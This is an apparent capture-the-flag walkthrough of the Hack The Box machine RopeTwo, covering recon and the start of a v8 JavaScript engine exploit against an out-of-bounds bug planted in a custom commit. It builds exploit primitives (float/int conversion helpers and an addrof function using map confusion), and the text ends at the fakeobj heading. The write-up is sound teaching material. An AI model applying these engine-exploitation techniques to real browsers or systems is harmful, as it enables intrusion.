---
title: HTB: RopeTwo
url: https://0xdf.gitlab.io/2021/01/16/htb-ropetwo.html
date: 2021-01-16T14:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: ctf, htb-ropetwo, hackthebox, pwn, python, c, javascript, v8, d8, gef, pwngdb, reverse-engineering, ghidra, gdb, xss, heap, pwntools, realloc, fake-chunk, tcache, unsorted-bin, main-arena, fsop, free-hook, heapinfo, kernel-pwn, kernel-debug, rop, kernel-rop, kaslr, ropgadget, stack-pivot, prepare-kernel-cred, commit-creds, apport, htb-traceback, apt, http-proxy, cve-2020-8831, wasm, wasm-fiddle, webassembly, htb-playertwo
---

![RopeTwo](https://0xdfimages.gitlab.io/img/ropetwo-cover.png)

RopeTwo, much like Rope, was just a lot of binary exploitation. It starts with a really neat attack on Google’s v8 JavaScript engine, with a couple of newly added vulnerable functions to allow out of bounds read and write. I’ll use that with an XSS vulnerability in the website to get code execution and a shell. To privesc to user, I’ll use a heap exploit in a SUID binary. The binary was very limiting on the way I could interact with the heap, which lead to my having to re-write my exploit from scratch several times. From user, I’ll escalate again by attacking a kernel module that created a vulnerable device. I’ll leak the kernel memory to get past KASLR, and use some common kernel exploit techniques to execute a ROP chain and return a root shell. In Beyond Root, I’ll look at the unintended method used to get first blood on this box.

## Box Info

| Name | [RopeTwo](https://hackthebox.com/machines/ropetwo)  [RopeTwo](https://hackthebox.com/machines/ropetwo) [Play on HackTheBox](https://hackthebox.com/machines/ropetwo) |
| --- | --- |
| Release Date | [27 Jun 2020](https://twitter.com/hackthebox_eu/status/1276143645431943169) |
| Retire Date | 16 Jan 2021 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for RopeTwo |
| Radar Graph | Radar chart for RopeTwo |
| First Blood User | 1 day22:50:35[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 1 day22:47:43[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [R4J R4J](https://app.hackthebox.com/users/13243) |

## Recon

### nmap

`nmap` found five open TCP ports, SSH (22), HTTP hosting GitLab via NGINX (5000), HTTP via Python (8000), HTTP via NGINX (8060), and unknown (9094):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.196
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-18 06:31 EDT
Nmap scan report for 10.10.10.196
Host is up (0.020s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
8000/tcp open  http-alt
8060/tcp open  aero
9094/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 8.67 seconds
root@kali# nmap -p 22,5000,8000,8060,9094 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.196
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-18 06:31 EDT
Nmap scan report for 10.10.10.196
Host is up (0.014s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bc:d9:40:18:5e:2b:2b:12:3d:0b:1f:f3:6f:03:1b:8f (RSA)
|   256 15:23:6f:a6:d8:13:6e:c4:5b:c5:4a:6f:5a:6b:0b:4d (ECDSA)
|_  256 83:44:a5:b4:88:c2:e9:28:41:6a:da:9e:a8:3a:10:90 (ED25519)
5000/tcp open  http    nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.196:5000/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
8000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.7.3)
|_http-title: Home
8060/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: 404 Not Found
9094/tcp open  unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.53 seconds

```

The [OpenSSH version](https://packages.ubuntu.com/search?keywords=openssh-server) is newer than any of the default packages for Ubuntu, but it does indicate the OS is Ubuntu.

### HTTP - TCP (8000)

This site is titled “v8 dev”:

[![image-20200718070721722](https://0xdfimages.gitlab.io/img/image-20200718070721722.png)](https://0xdfimages.gitlab.io/img/image-20200718070721722.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200718070721722.png)

[v8.dev](https://v8.dev/) is an actual website dedicated to Google’s open source JavaScript WebAssembly engine.

The Download link at the top downloads `chrome.tar.gz`.

The Contact Us link leads to a form:

![image-20200718071343364](https://0xdfimages.gitlab.io/img/image-20200718071343364.png)

Submitting it returns just the text “Sent”.

The link to “Checkout the source code here” leads to `http://gitlab.rope2.htb:5000/root/v8`. I’ll note the virtual hostname.

### Fuzzing Virtual Hosts

I fuzzed all three webservers with `wfuzz` looking for additional virtual hosts, but didn’t find any. I’ll add the two domains to my `/etc/hosts` file:

```
10.10.10.196 rope2.htb gitlab.rope2.htb

```

### GitLab - TCP 5000

#### Site

As far as I can tell, the site is the same accessed by IP or by hostname `gitlab.rope2.htb`.

The page root redirects to `http://10.10.10.196:5000/users/sign_in` which is the login form for GitLab:

![image-20200718064006158](https://0xdfimages.gitlab.io/img/image-20200718064006158.png)

There is a `robots.txt` (`nmap` noted it above):

[![image-20200718070110119](https://0xdfimages.gitlab.io/img/image-20200718070110119.png)](https://0xdfimages.gitlab.io/img/image-20200718070110119.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200718070110119.png)

My guess is that this is the default GitLab `robots.txt` file. In fact, it looks very similar (though slightly different from the one in the [GitLab source code](https://gitlab.com/gitlab-org/gitlab/-/blob/fee892aa2d8b3b8559b65c30f88190970400ef90/public/robots.txt). Any of the paths I tried redirected to the login screen or didn’t provide anything new.

I can click the Explore link at the bottom left, and under the “All” tab, there is a single project:

![image-20201110073441316](https://0xdfimages.gitlab.io/img/image-20201110073441316.png)

It’s the code for Google’s v8 Javascript engine, which looks to be a clone of the [public v8 repo](https://github.com/v8/v8):

[![image-20201110073610835](https://0xdfimages.gitlab.io/img/image-20201110073610835.png)](https://0xdfimages.gitlab.io/img/image-20201110073610835.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20201110073610835.png)

#### Repo Analysis

The commits on this RopeTwo version show a ton leading up to 26 May, and then one commit from the box author on 27 May:

[![image-20201110074721285](https://0xdfimages.gitlab.io/img/image-20201110074721285.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20201110074721285.png)

I’ll compare this with the [commits on the public version around that same time](https://github.com/v8/v8/commits/master?after=008c5a6a79e25773ad9a2665f56c4bd89671a15b+0&branch=master):

[![image-20201110074732152](https://0xdfimages.gitlab.io/img/image-20201110074732152.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20201110074732152.png)

All of the commits from the RopeTwo version are in the public one except for the one from r4j0x00. This commit shows changes to four files:

[![image-20201110075211478](https://0xdfimages.gitlab.io/img/image-20201110075211478.png)](https://0xdfimages.gitlab.io/img/image-20201110075211478.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20201110075211478.png)

Like the commit message says, it is adding two functions to the basic Array builtin object - `GetLastElement` and `SetLastElement`.

#### Code Analysis

There’s a clear bug in this code that is added in the last commit by r4j0x00, which can be seen in this line from `GetLastElement`:

```

return *(isolate->factory()->NewNumber(elements.get_scalar(len)));

```

and this line from `SetLastElement`:

```

elements.set(len,value->Number());

```

Arrays are 0 indexed, so this is reading / writing one element beyond the end of the array. Googling for “v8 exploit oob” (oob = out of bounds) returns a bunch of CTF solutions, which is promising for me:

![image-20201111070048172](https://0xdfimages.gitlab.io/img/image-20201111070048172.png)

## JavaScript Background

### Exploit Strategy

Before going into the background, I wanted to give a highlevel idea of how the exploit will work. The idea is that I am going to create an array of doubles, which will have this new function added by r4j that allows read / write beyond the end of the array. That just so happens to provide read/write on the memory that describes what’s in the array. I can change identifier between array of doubles and array of objects, which changes how JavaScript handles the values. For doubles, it gets the values from there. For objects, it has pointers to the objects. Being able to write something as a number and then change it to a pointer or vice versa will lead to arbitrary read and write in memory, which leads to execution.

### Debugging

#### Build d8

`d8` is the JavaScript REPL created by Google for v8. It’s the same engine that will run in the browser, but I can test from the command line and debug it with `gdb` to see memory. I’m also going to work on a Ubuntu VM, as that’s where these tools are made to run.

I’ll take the following steps to build both debug and release copies of `d8` with the vulnerable functions from RopeTwo. First, install Google’s “depot\_tools”:

```

df@buntu:~/tools$ git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
...[snip]...
df@buntu:~/tools$ echo 'export PATH=/home/df/tools/depot_tools:$PATH' >> ~/.bashrc 

```

I’ll need a way to get the RopeTwo version of v8 to my box. I could probably do it from the GitLab server, but I instead went to the r4j commit, and at the top right, hit the “Options” button and selected “Plain Diff”:

![image-20201111160945753](https://0xdfimages.gitlab.io/img/image-20201111160945753.png)

I saved the resulting text as `r4j.diff`.

Now, I’ll get `v8`, go into that directory, run the build dependencies script (output removed for readability):

```

df@buntu:~$ fetch v8
df@buntu:~$ cd v8
df@buntu:~/v8$ ./build/install-build-deps.sh

```

I need the commit before the r4j commit:

![image-20201111161221431](https://0xdfimages.gitlab.io/img/image-20201111161221431.png)

I’ll check that commit out (it will exist in the public repo), and then `sync`, and apply the diff file:

```

df@buntu:~/v8$ git checkout 5c05acf729b557b01b6eb9992733417f6d2b8021
df@buntu:~/v8$ gclient sync
df@buntu:~/v8$ git apply ../r4j.diff

```

At this point I’m ready to build. I’ll build both the release and debug versions, and both will take a long time.

```

df@buntu:~/v8$ ./tools/dev/v8gen.py x64.release
df@buntu:~/v8$ ninja -C ./out.gn/x64.release
df@buntu:~/v8$ ./tools/dev/v8gen.py x64.debug
df@buntu:~/v8$ ninja -C ./out.gn/x64.debug

```

Now there’s a `db` binary in each of the two folders. The debug version will provide more information in the REPL, but it won’t allow for out of bounds reads/writes without crashing (to support fuzzing), and so I’ll need the release version when I start exploiting.

#### Debugging

I’ve got the [GDB Enhanced Features](https://github.com/hugsy/gef) (GEF) plugin installed to help `gdb` here.

To debug, I’ll start `gdb` on one of the `d8` binaries:

```

df@buntu:~/v8$ gdb -q out.gn/x64.release/d8
GEF for linux ready, type `gef' to start, `gef config' to configure
80 commands loaded for GDB 9.2 using Python engine 3.8
Reading symbols from out.gn/x64.release/d8...
(No debugging symbols found in out.gn/x64.release/d8)
gef➤

```

I’ll start `d8` with two flags:
- `--allow-natives-syntax` will provide access to extra commands like `%DebugPrint` which will be useful;
- `--shell` will drop to a REPL even if I pass it a file to run, kind of like `-i` in Python.

```

gef➤  run --allow-natives-syntax --shell
Starting program: /home/df/v8/out.gn/x64.release/d8 --allow-natives-syntax --shell
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7f9e1b674700 (LWP 35328)]
V8 version 8.5.0 (candidate)
d8> 

```

I’ll make more use of the `--shell` later as I start to build functions that provide value in a file, and want to start, run that file to get access to those functions, and then drop to a shell.

### JavaScript Arrays

This post, [Exploiting Logic Bugs in JavaScript JIT Engines](http://www.phrack.org/papers/jit_exploitation.html) is a super detailed post that gives a ton of background on this stuff. I’ll use it, along with a handful of references I’ll cite as I go through this to show how this works.

Because the two new functions provide out of bounds read and write in JavaScript arrays, I’ll need to understand what those look like in memory. [This post](https://www.elttam.com/blog/simple-bugs-with-complex-exploits/#arrays-in-v8) does a nice job laying it out, and I’ll use their diagram below. When I create an array `[1, 2, 3, 4]`, JavaScript creates two objects, a `JSArray` object and a `FixedArray` object:

```

       A JSArray object                      A FixedArray object
+-----------------------------+       +------------------------------+
|                             |       |                              |
|         Map Pointer         |   +-->+         Map Pointer          |
|                             |   |   |                              |
+-----------------------------+   |   +------------------------------+
|                             |   |   |                              |
|      Properties Pointer     |   |   |     Backing Store Length     |
|                             |   |   |                              |
+-----------------------------+   |   +------------------------------+
|                             |   |   |                              |
|       Elements Pointer      +---+   |          0x00000002          | index 0
|                             |       |                              |
+-----------------------------+       +------------------------------+
|                             |       |                              |
|        Array Length         |       |          0x00000004          | index 1
|                             |       |                              |
+-----------------------------+       +------------------------------+
|                             |       |                              |
| Other unimportant fields... |       |          0x00000006          | index 2
|                             |       |                              |
+-----------------------------+       +------------------------------+
                                      |                              |
                                      |          0x00000008          | index 3
                                      |                              |
                                      +------------------------------+

```

The Map Pointer in the `JSArray` object points to a map object that tells d8 what kind of data to expect and how to refer to the different indexes in the `FixedArray` object. The array length is also held in the `JSArray`. The “Backing Store Length” is not used for anything I care about.

### JavaScript Pointer Compression

In the diagram above, each word is 32-bits. On a x64 machine, there are three kinds of fields that `d8` will use:
- Doubles - 64 bit words representing floating point numbers;
- Immediate Small Integers (Smi) - 31 bit integer values, stored in memory shifted up one bit so that the lowest bit is always 0 (hence why 1, 2, 3, 4 shows up as 2, 4, 6, 8 in the diagram above);
- Pointers - represented as 32-bits with the low bit always 1 (it’s important to subtract 1 when looking at memory in `gdb`), and the upper 32-bits the same for any given process.

The Smis and pointers were different before v8.0, where V8 implemented what they call pointer compression, which reports to reduce memory usage by 40%. Before this, but Smis and pointers used the full 64-bit word on a x64 machine. This is important to note because one of the CTF walkthroughs I’ll follow are based on versions before pointer compression, so the output will look a bit different.

### Exploring Memory

#### Array of Doubles

[Faith](https://faraz.faith/) (who graciously helped me with a lot of this process) has [this excellent writeup](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/) for a 2019 \*ctf challenge, oob-v8. Before going into exploitation, he shows how memory is set up for various arrays. This example is before pointer compression, so I’ll show the same examples on this version from RopeTwo.

I’ll start with the debug version in `gdb`:

```

df@buntu:~/v8$ gdb -q out.gn/x64.debug/d8
GEF for linux ready, type `gef' to start, `gef config' to configure
80 commands loaded for GDB 9.2 using Python engine 3.8
Reading symbols from out.gn/x64.debug/d8...
gef➤  run --allow-natives-syntax
Starting program: /home/df/v8/out.gn/x64.debug/d8 --allow-natives-syntax
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7fc904992700 (LWP 35399)]
V8 version 8.5.0 (candidate)
d8>

```

Create an array of doubles, and look at it. `%DebugPrint` will show details about the object:

```

d8> var a = [1.1, 2.2];
undefined
d8> %DebugPrint(a);
DebugPrint: 0x25cc080c5e35: [JSArray]
 - map: 0x25cc08281909 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x25cc0824923d <JSArray[0]>
 - elements: 0x25cc080c5e1d <FixedDoubleArray[2]> [PACKED_DOUBLE_ELEMENTS]
 - length: 2
 - properties: 0x25cc080406e9 <FixedArray[0]> {
    #length: 0x25cc081c0165 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x25cc080c5e1d <FixedDoubleArray[2]> {
           0: 1.1
           1: 2.2
 }
0x25cc08281909: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x25cc082818e1 <Map(HOLEY_SMI_ELEMENTS)>
 - prototype_validity cell: 0x25cc081c0451 <Cell value= 1>
 - instance descriptors #1: 0x25cc08249911 <DescriptorArray[1]>
 - transitions #1: 0x25cc0824995d <TransitionArray[4]>Transition array #1:
     0x25cc08042f3d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x25cc08281931 <Map(HOLEY_DOUBLE_ELEMENTS)>
 - prototype: 0x25cc0824923d <JSArray[0]>
 - constructor: 0x25cc08249111 <JSFunction Array (sfi = 0x25cc081cc41d)>
 - dependent code: 0x25cc080401ed <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

[1.1, 2.2]

```

The Map information shows the elements kind as `PACKED_DOUBLE_ELEMENTS`. The [Elttam post](https://www.elttam.com/blog/simple-bugs-with-complex-exploits/#elements-kinds) talks about this as well. This means the array contains only 64-bit floats and has a value in every slot.

If I drop out of the `db` prompt into `gdb` (Ctrl-c), I can look at the memory address of this array:

```

gef➤  x/4xw 0x25cc080c5e35-1
0x25cc080c5e34: 0x08281909      0x080406e9      0x080c5e1d      0x00000004

```

The first word is the pointer to the map object, which once I add the top 32-bits, matches the debug output above, 0x25cc08281909. The second is the properties, then the elements, and finally the length of 2 (need to divide by two to account for the left shift).

The elements object has it’s own map, and a backing length, and then the two double word values:

```

gef➤  x/10xw 0x25cc080c5e1d-1
0x25cc080c5e1c: 0x08040a3d      0x00000004      0x9999999a      0x3ff19999
0x25cc080c5e2c: 0x9999999a      0x40019999      0x08281909      0x080406e9
0x25cc080c5e3c: 0x080c5e1d      0x00000004

```

Again, it’s the elements kind in the map that tells v8 to read the elements as 64-bit floats and not 32-bit pointers.

What’s particularly interesting is that just after the second double (0x400199999999999a == 2.2) comes the `JSArray` object. I’ll come back to this later.

#### Array of Objects

Instead of doubles, what happens with an array containing an object:

```

d8> var obj = {"A":1.1};
undefined
d8> var obj_arr = [obj];
undefined
d8> %DebugPrint(obj);
DebugPrint: 0x25cc080c88d9: [JS_OBJECT_TYPE]
 - map: 0x25cc08284ef1 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x25cc08241351 <Object map = 0x25cc082801c1>
 - elements: 0x25cc080406e9 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x25cc080406e9 <FixedArray[0]> {
    #A: 0x25cc080c88e9 <HeapNumber 1.1> (const data field 0)
 }
0x25cc08284ef1: [Map]
 - type: JS_OBJECT_TYPE
 - instance size: 16
 - inobject properties: 1
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: 1
 - stable_map
 - back pointer: 0x25cc08284ec9 <Map(HOLEY_ELEMENTS)>
 - prototype_validity cell: 0x25cc081c0451 <Cell value= 1>
 - instance descriptors (own) #1: 0x25cc080c7c4d <DescriptorArray[1]>
 - prototype: 0x25cc08241351 <Object map = 0x25cc082801c1>
 - constructor: 0x25cc0824136d <JSFunction Object (sfi = 0x25cc081c5971)>
 - dependent code: 0x25cc080401ed <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

{A: 1.1}
d8> %DebugPrint(obj_arr);
DebugPrint: 0x25cc080c8939: [JSArray]
 - map: 0x25cc08281959 <Map(PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x25cc0824923d <JSArray[0]>
 - elements: 0x25cc080c892d <FixedArray[1]> [PACKED_ELEMENTS]
 - length: 1
 - properties: 0x25cc080406e9 <FixedArray[0]> {
    #length: 0x25cc081c0165 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x25cc080c892d <FixedArray[1]> {
           0: 0x25cc080c88d9 <Object map = 0x25cc08284ef1>
 }
0x25cc08281959: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - elements kind: PACKED_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x25cc08281931 <Map(HOLEY_DOUBLE_ELEMENTS)>
 - prototype_validity cell: 0x25cc081c0451 <Cell value= 1>
 - instance descriptors #1: 0x25cc08249911 <DescriptorArray[1]>
 - transitions #1: 0x25cc0824998d <TransitionArray[4]>Transition array #1:
     0x25cc08042f3d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_ELEMENTS) -> 0x25cc08281981 <Map(HOLEY_ELEMENTS)>
 - prototype: 0x25cc0824923d <JSArray[0]>
 - constructor: 0x25cc08249111 <JSFunction Array (sfi = 0x25cc081cc41d)>
 - dependent code: 0x25cc080401ed <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

[{A: 1.1}]

```

This time, the `obj_arr` is of type `PACKED_ELEMENTS` (contiguous pointers), and `obj` is of type `HOLEY_ELEMENTS`, which makes sense, since it’s a dictionary.

Looking at the memory, starting with the `obj_arr` object:

```

gef➤  x/4xw 0x25cc080c8939-1
0x25cc080c8938: 0x08281959      0x080406e9      0x080c892d      0x00000002

```

That’s map, props, elements, length (2 » 1 == 1). The elements are just before the this object:

```

gef➤  x/4xw 0x25cc080c892d-1
0x25cc080c892c: 0x080404b1      0x00000002      0x080c88d9      0x08281959

```

That’s map for elements, length (2 » 1 == 1), pointer to `obj`, and then the map for `obj_arr`. The way that v8 knows to read that as a pointer to `obj` and not read a double is the map. This is critical, because I’ll be messing with the map data in the exploits to come.

#### Maps

There’s one more important thing to know about maps. If two objects have the same structure, they will share the same map. The [phrack paper](http://www.phrack.org/papers/jit_exploitation.html) uses this example / diagram:

```

    let o1 = {a: 42, b: 43};
    let o2 = {a: 1337, b: 1338};
                      +----------------+
                      |                |
                      | map1           |
                      |                |
                      | property: slot |
                      |      .a : 0    |
                      |      .b : 1    |
                      |                |
                      +----------------+
                          ^         ^
    +--------------+      |         |
    |              +------+         |
    |    o1        |           +--------------+
    |              |           |              |
    | slot : value |           |    o2        |
    |    0 : 42    |           |              |
    |    1 : 43    |           | slot : value |
    +--------------+           |    0 : 1337  |
                               |    1 : 1338  |
                               +--------------+

```

From `d8` / `gdb`:

```

d8> var o1 = {a: 42, b: 43};
undefined
d8> var o2 = {a: 1337, b: 1338};
undefined
d8> %DebugPrint(o1);
DebugPrint: 0x25cc080c8d95: [JS_OBJECT_TYPE]
 - map: 0x25cc08284f69 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x25cc08241351 <Object map = 0x25cc082801c1>
 - elements: 0x25cc080406e9 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x25cc080406e9 <FixedArray[0]> {
    #a: 42 (const data field 0)
    #b: 43 (const data field 1)
 }
...[snip]...
{a: 42, b: 43}
d8> %DebugPrint(o2);
DebugPrint: 0x25cc080c8e2d: [JS_OBJECT_TYPE]
 - map: 0x25cc08284f69 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x25cc08241351 <Object map = 0x25cc082801c1>
 - elements: 0x25cc080406e9 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x25cc080406e9 <FixedArray[0]> {
    #a: 1337 (const data field 0)
    #b: 1338 (const data field 1)
 }
...[snip]...
{a: 1337, b: 1338}

```

Both objects have the same map, 0x25cc08284f69.

## Shell as chromeuser

### v8 Exploit Primitives

[Faith’s writeup of oob-v8](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/) provides a nice roadmap for exploitation here, and I’ll try to call out where I diverge from it.

#### ftoi and itof

I’ll start my script with a couple of helper functions. Because my out of bounds reads will be looking to return doubles (floats), I’ll want some code to convert those back to hex values. Similarly, I’ll need a way to take an int to a float to write. These functions come directly from the above post:

```

/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

```

I’ll save those in my `exploit.js`.

Now that I’m going to be reading / writing across bounds, I’ll use the release `d8`:

```

df@buntu:~/v8$ gdb -q out.gn/x64.release/d8
GEF for linux ready, type `gef' to start, `gef config' to configure
80 commands loaded for GDB 9.2 using Python engine 3.8
Reading symbols from out.gn/x64.release/d8...
(No debugging symbols found in out.gn/x64.release/d8)
gef➤  run --allow-natives-syntax --shell exploit.js 
Starting program: /home/df/v8/out.gn/x64.release/d8 --allow-natives-syntax --shell exploit.js
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7f4f99173700 (LWP 35638)]
V8 version 8.5.0 (candidate)
d8> 

```

I’ll create an array, `a` (`%DebugPrint` shows much less on the release `d8`):

```

d8> var a = [1.1, 2.2];
undefined
d8> %DebugPrint(a);
0x2b4108086155 <JSArray[2]>
[1.1, 2.2]

```

`GetLastElement` returns a float that doesn’t mean much to me:

```

d8> a.GetLastElement()
4.73859563718219e-270

```

However, if I convert to back to an int (and then to hex, I recognize the two 32-bit pointers):

```

d8> ftoi(a.GetLastElement())
577594250143996169n
d8> ftoi(a.GetLastElement()).toString(16)
"80406e908241909"

```

I can drop into `gdb` and look at the object, knowing it’s third item is the pointer to the elements array:

```

gef➤  x/4xw 0x2b4108086155-1
0x2b4108086154: 0x08241909      0x080406e9      0x0808613d      0x00000004

```

When I add the high 32-bits and subtract one, it shows the pointer to the map, the size, the two floats (each two words), and then the next two pointers which are the original map and properties, and what returned from `GetLastElement`:

```

gef➤  x/8xw 0x2b410808613d-1
0x2b410808613c: 0x08040a3d      0x00000004      0x9999999a      0x3ff19999
0x2b410808614c: 0x9999999a      0x40019999      0x08241909      0x080406e9

```

#### addrof

I will use these vulnerable functions to create my first exploit primitive, `addrof`. `addrof` is a function that takes an object and returns its address in memory. The exploit here will rely on the out of bounds read and write to mess with the maps for various objects. Because of the nature of the functions that allow my out of bounds access and pointer compression, there’s a bit of a curve ball as compared to [Faith’s writeup of oob-v8](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/). When I create an object like `var a = [1.1]`, memory looks like:

```

| Map Ptr | BS Length | 1.1                |   <-- FixedArray Object
| Map Ptr | Properties| Elements ptr | Len |   <-- JSArray Object

```

So when I call `GetLastElement`, it casts all the memory as 64-bit floats, and then reads past value and returns the map pointer and the properties. So far, just like the post.

The trick comes when I create `var b = [{"A": 1}]`. Instead of 64-bits representing 1.1, there’s now a pointer to the object `{"A":1}`. But because of pointer compression, that’s a 32-bit pointer. So calling `GetLastElement` casts everything to be doubles, so that pointer + the map pointer is element 0, and then the properties and the elements pointer are object 1, which is returned.

This does give me access to the elements pointer, which provides a different exploitation path as well. But to continue down this path of messing with maps, I’ll need to jump through a couple extra hoops to get things to align:
- Start with an array with a single float in it, so that the memory aligns how I want it.
- Change the map to reflect an array with a single object.
- Set the first element of the array to the object I want to locate. Because the map is the same, the elements pointer won’t change, which is what I want, and the pointer will overwrite the first half of the original float.
- Change the map back to a float.
- Read the value of the first object (index 0) of the array, which contains the pointer to the object, which comes back as as float.

In practice, I’ll start a `d8` shell in `gdb` with I’ll start with `exploit.js` providing the two functions in the previous section.

```

gef➤  run --allow-natives-syntax exploit.js --shell
Starting program: /home/df/v8/out.gn/x64.release/d8 --allow-natives-syntax exploit.js --shell
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7fb0ed6ad700 (LWP 63204)]
V8 version 8.5.0 (candidate)
d8>

```

I’ll create an object, `obj`. I can run `%DebugPrint` here to see the address in memory, but I won’t have access to that in a live exploit.

```

d8> var obj = {"findme": 1};
undefined
d8> %DebugPrint(obj);
0x3ecd0808823d <Object map = 0x3ecd08244e51>
{findme: 1}

```

To find it’s address, I’m going to start with a float array. It’s map will be `PACKED_DOUBLE_ELEMENTS`:

```

d8> var arr = [1.1];
undefined
d8> %DebugPrint(arr)
0x3ecd080889b9 <JSArray[1]>
[1.1]

```

I can leak that map (and the properties as I get 64-bits, but the map pointer is compressed to 32-bits) using the `GetLastElement` function:

```

d8> ftoi(arr.GetLastElement()).toString(16);
"80406e908241909"   <-- low word is map, high is props
d8> ^C
Thread 1 "d8" received signal SIGINT, Interrupt.
__GI___libc_read (nbytes=0x400, buf=0x55a7e1620250, fd=0x0) at ../sysdeps/unix/sysv/linux/read.c:26
26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
gef➤  x/4xw 0x3ecd080889b9-1
0x3ecd080889b8: 0x08241909      0x080406e9      0x080889a9      0x00000002

```

I’ll save that, as I’ll need it:

```

d8> var float_map = ftoi(arr.GetLastElement());
undefined

```

I don’t have a good way to leak a map of an array with a single object in it (remember the vulnerable function is only for arrays). But through some analysis in `gdb`, it looks like that maps is always 0x50 bytes past the map for `[1.1]`. Knowing that, I can change the map, and then put the object I’m targeting into this array:

```

d8> arr.SetLastElement(itof(float_map+0x50n));
undefined
d8> arr[0] = obj;
{findme: 1}

```

The elements address doesn’t change, and the object address pointer now overwrites the high bytes of the old 1.1 value:

```

d8> ^C
Thread 1 "d8" received signal SIGINT, Interrupt.
__GI___libc_read (nbytes=0x400, buf=0x55a7e1620250, fd=0x0) at ../sysdeps/unix/sysv/linux/read.c:26
26      in ../sysdeps/unix/sysv/linux/read.c
gef➤  x/8xw 0x3ecd080889a9-1
0x3ecd080889a8: 0x08040a3d      0x00000002      0x0808823d      0x3ff19999  <-- FixedArray: map, len, pointer, garbage
0x3ecd080889b8: 0x08241959      0x080406e9      0x080889a9      0x00000002  <-- JSArray: map, props, elements, len

```

I’ll set the map back to float, and then read that value out:

```

d8> arr.SetLastElement(itof(float_map))
undefined
d8> ftoi(arr).toString(16)
"3ff199990808823d"

```

I’ll add the following to `exploit.js`:

```

var arr = [1.1];
var float_array_map = ftoi(arr.GetLastElement());
var obj_array_map = float_array_map + 0x50n;

function addrof(target) {
    arr.SetLastElement(itof(obj_array_map));
    arr[0] = target;
    arr.SetLastElement(itof(float_array_map));
    return ftoi(arr[0]) & 0xffffffffn;
}

```

And it works:

```

d8> obj = {"findme": 1};
{findme: 1}
d8> %DebugPrint(obj)
0x168308086861 <Object map = 0x168308244e29>
{findme: 1}
d8> addrof(obj).toString(16)
"8086861"

```

#### fakeobj

